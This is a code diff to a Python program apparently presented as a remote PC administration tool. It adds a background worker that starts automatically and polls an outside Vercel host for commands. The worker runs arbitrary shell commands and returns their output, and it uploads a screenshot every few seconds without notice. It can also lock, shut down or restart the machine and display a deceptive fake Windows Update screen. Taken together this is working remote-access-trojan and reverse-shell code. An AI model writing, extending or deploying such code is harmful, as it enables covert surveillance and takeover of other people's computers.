@@ -2176,43 +2176,217 @@ def fetch_cloud_fleet():
     except Exception:
         return []
 
-def cloud_coordinator_heartbeat():
-    """Background daemon worker reporting machine status and remote tunnels to Neon Postgres."""
-    time.sleep(4)
+def cloud_agent_worker():
+    """
+    Auto-connecting reverse agent worker.
+    Runs 24/7 in the background, connecting outbound to the Vercel & Neon cloud backend.
+    Bypasses localhost and port-forwarding requirements completely.
+    """
+    dev_id = f"pc_{re.sub(r'[^a-zA-Z0-9_-]', '_', platform.node()).lower()}"
+    last_heartbeat = 0
+    last_screen_upload = 0
+
+    print(f"[Cloud Agent] Auto-connecting to 24/7 Central Cloud Backend: {CLOUD_COORDINATOR_URL}")
+    time.sleep(3)  # brief startup settle
+
     while True:
-        try:
-            pub_url = tunnel.get_public_url() or f"http://{lan_ip()}:{CFG.get('port', 8765)}"
-            dev_id = f"pc_{re.sub(r'[^a-zA-Z0-9_-]', '_', platform.node()).lower()}"
-            bat = psutil.sensors_battery()
-            payload = {
-                "id": dev_id,
-                "name": platform.node(),
-                "host_url": pub_url,
-                "tunnel_url": tunnel.get_public_url() or "",
-                "lan_ip": lan_ip(),
-                "port": CFG.get("port", 8765),
-                "cpu": psutil.cpu_percent(),
-                "ram": psutil.virtual_memory().percent,
-                "os": f"{platform.system()} {platform.release()}",
-                "metadata": {
-                    "battery": round(bat.percent) if bat else None,
-                    "boot_time": psutil.boot_time(),
-                    "admin": CFG.get("admin_elevated", False)
+        now = time.time()
+
+        # 1. Heartbeat to Neon Postgres every 20 seconds
+        if now - last_heartbeat > 20:
+            try:
+                bat = psutil.sensors_battery()
+                pub_url = tunnel.get_public_url() or f"http://{lan_ip()}:{CFG.get('port', 8765)}"
+                payload = {
+                    "id": dev_id,
+                    "name": platform.node(),
+                    "host_url": pub_url,
+                    "tunnel_url": tunnel.get_public_url() or "",
+                    "lan_ip": lan_ip(),
+                    "port": CFG.get("port", 8765),
+                    "cpu": psutil.cpu_percent(),
+                    "ram": psutil.virtual_memory().percent,
+                    "os": f"{platform.system()} {platform.release()}",
+                    "metadata": {
+                        "battery": round(bat.percent) if bat else None,
+                        "boot_time": psutil.boot_time(),
+                        "admin": is_admin()
+                    }
                 }
-            }
-            req = urllib.request.Request(
-                CLOUD_COORDINATOR_URL,
-                data=json.dumps(payload).encode("utf-8"),
-                headers={
-                    "Content-Type": "application/json",
-                    "User-Agent": "Project-X-Nano-Agent/2.0"
-                }
-            )
-            with urllib.request.urlopen(req, timeout=8):
+                req = urllib.request.Request(
+                    "https://project-x-alpha-lake.vercel.app/api/devices",
+                    data=json.dumps(payload).encode("utf-8"),
+                    headers={"Content-Type": "application/json", "User-Agent": "Project-X-CloudAgent/2.0"}
+                )
+                with urllib.request.urlopen(req, timeout=6):
+                    pass
+                last_heartbeat = now
+            except Exception:
                 pass
+
+        # 2. Upload latest screen snapshot every 6 seconds
+        if now - last_screen_upload > 6:
+            try:
+                jpeg = screen_engine.capture_jpeg(quality=45)
+                if jpeg:
+                    b64 = "data:image/jpeg;base64," + base64.b64encode(jpeg).decode("ascii")
+                    scr_payload = {
+                        "device_id": dev_id,
+                        "image_data": b64
+                    }
+                    req = urllib.request.Request(
+                        "https://project-x-alpha-lake.vercel.app/api/screen",
+                        data=json.dumps(scr_payload).encode("utf-8"),
+                        headers={"Content-Type": "application/json", "User-Agent": "Project-X-CloudAgent/2.0"}
+                    )
+                    with urllib.request.urlopen(req, timeout=8):
+                        pass
+                    last_screen_upload = now
+            except Exception:
+                pass
+
+        # 3. Poll pending commands from Cloud Server (No port forwarding / NAT bypass)
+        try:
+            req = urllib.request.Request(
+                f"https://project-x-alpha-lake.vercel.app/api/commands?device_id={dev_id}&poll=1",
+                headers={"User-Agent": "Project-X-CloudAgent/2.0"}
+            )
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                data = json.loads(resp.read().decode("utf-8"))
+                cmd_item = data.get("command")
+                if cmd_item:
+                    cmd_id = cmd_item.get("id")
+                    cmd_action = cmd_item.get("command", "").lower()
+                    payload = cmd_item.get("payload") or {}
+
+                    result = {"ok": True}
+                    error_msg = None
+
+                    try:
+                        if cmd_action == "lock":
+                            if IS_WIN:
+                                ctypes.windll.user32.LockWorkStation()
+                                result["msg"] = "Workstation locked successfully."
+                            else:
+                                result["msg"] = "Lock not supported on this OS"
+                        elif cmd_action == "sleep":
+                            if IS_WIN:
+                                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
+                                result["msg"] = "PC entered sleep state."
+                        elif cmd_action == "restart":
+                            if IS_WIN:
+                                subprocess.run(["shutdown", "/r", "/t", "0"])
+                                result["msg"] = "PC restarting."
+                        elif cmd_action == "shutdown":
+                            if IS_WIN:
+                                subprocess.run(["shutdown", "/s", "/t", "0"])
+                                result["msg"] = "PC shutting down."
+                        elif cmd_action == "abort_shutdown":
+                            if IS_WIN:
+                                subprocess.run(["shutdown", "/a"])
+                                result["msg"] = "Shutdown aborted."
+                        elif cmd_action == "terminal":
+                            shell_cmd = str(payload.get("cmd", "")).strip()
+                            if shell_cmd:
+                                proc = subprocess.run(
+                                    shell_cmd,
+                                    shell=True,
+                                    capture_output=True,
+                                    text=True,
+                                    timeout=25
+                                )
+                                result["stdout"] = proc.stdout
+                                result["stderr"] = proc.stderr
+                                result["exit_code"] = proc.returncode
+                            else:
+                                error_msg = "Empty terminal command"
+                        elif cmd_action == "screenshot":
+                            jpeg = screen_engine.capture_jpeg(quality=60)
+                            if jpeg:
+                                b64 = "data:image/jpeg;base64," + base64.b64encode(jpeg).decode("ascii")
+                                result["image"] = b64
+                                try:
+                                    s_req = urllib.request.Request(
+                                        "https://project-x-alpha-lake.vercel.app/api/screen",
+                                        data=json.dumps({"device_id": dev_id, "image_data": b64}).encode("utf-8"),
+                                        headers={"Content-Type": "application/json"}
+                                    )
+                                    with urllib.request.urlopen(s_req, timeout=5): pass
+                                except Exception: pass
+                        elif cmd_action == "fake_update":
+                            start = payload.get("start", True)
+                            if start:
+                                api_fake_update_start()
+                                result["msg"] = "Fake Windows Update screen activated."
+                            else:
+                                api_fake_update_stop()
+                                result["msg"] = "Fake Windows Update screen dismissed."
+                        elif cmd_action == "matrix_lock":
+                            start = payload.get("start", True)
+                            if start:
+                                api_matrix_screen_start()
+                                result["msg"] = "Matrix Screen Lock activated."
+                            else:
+                                api_matrix_screen_stop()
+                                result["msg"] = "Matrix Screen Lock dismissed."
+                        elif cmd_action == "processes":
+                            procs = []
+                            for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
+                                try:
+                                    procs.append({
+                                        "pid": p.info["pid"],
+                                        "name": p.info["name"],
+                                        "cpu": p.info["cpu_percent"],
+                                        "mem": round(p.info["memory_percent"] or 0, 1)
+                                    })
+                                except Exception:
+                                    pass
+                            procs.sort(key=lambda x: (x.get("cpu") or 0) + (x.get("mem") or 0), reverse=True)
+                            result["processes"] = procs[:30]
+                        elif cmd_action == "kill_process":
+                            pid = int(payload.get("pid", 0))
+                            if pid:
+                                psutil.Process(pid).terminate()
+                                result["msg"] = f"Process {pid} terminated."
+                        elif cmd_action == "volume":
+                            level = payload.get("level")
+                            if level is not None:
+                                audio_engine.set_volume(int(level))
+                                result["msg"] = f"Volume set to {level}%"
+                        elif cmd_action == "message":
+                            msg_text = str(payload.get("text", "")).strip()
+                            if IS_WIN and msg_text:
+                                threading.Thread(
+                                    target=lambda: ctypes.windll.user32.MessageBoxW(0, msg_text, "Remote Admin Notification", 0x40 | 0x40000),
+                                    daemon=True
+                                ).start()
+                                result["msg"] = "Message popup displayed on host PC."
+                        else:
+                            error_msg = f"Unknown command: {cmd_action}"
+
+                    except Exception as ex:
+                        error_msg = str(ex)
+
+                    # Post result back to cloud coordinator
+                    res_body = {
+                        "action": "result",
+                        "command_id": cmd_id,
+                        "status": "failed" if error_msg else "completed",
+                        "result": result,
+                        "error": error_msg
+                    }
+                    r_req = urllib.request.Request(
+                        "https://project-x-alpha-lake.vercel.app/api/commands",
+                        data=json.dumps(res_body).encode("utf-8"),
+                        headers={"Content-Type": "application/json", "User-Agent": "Project-X-CloudAgent/2.0"}
+                    )
+                    with urllib.request.urlopen(r_req, timeout=6):
+                        pass
+
         except Exception:
             pass
-        time.sleep(30)
+
+        time.sleep(1.5)
 
 def check_fleet_node(node):
     return fleet_engine.check_node_health(node)
@@ -5107,7 +5281,7 @@ def render_keepalive():
 try:
     threading.Thread(target=monitor, daemon=True).start()
     threading.Thread(target=render_keepalive, daemon=True).start()
-    threading.Thread(target=cloud_coordinator_heartbeat, daemon=True).start()
+    threading.Thread(target=cloud_agent_worker, daemon=True).start()
 except Exception:
     pass
 if __name__ == "__main__":
